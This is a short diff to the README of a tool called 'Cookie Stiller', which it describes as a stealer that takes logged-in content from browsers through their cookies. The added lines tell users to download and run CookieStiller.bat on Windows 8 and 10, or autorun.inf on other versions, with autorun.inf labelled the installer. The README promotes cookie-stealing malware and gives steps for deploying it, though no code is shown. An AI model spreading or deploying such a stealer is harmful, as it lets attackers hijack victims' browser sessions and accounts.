@@ -20,6 +20,10 @@ Cookie Stiller - A stiller that steals flogged content from browsers using cooki
 # 5.Amigo
 
 # Use
+# Windows 8 10
+Just download the file and run (CookieStiller. bat)
+# Other versions
+Just download the file and run (autorun.inf)
 File autorun.inf - installer
 
 File CookieStiller.bat - Working file
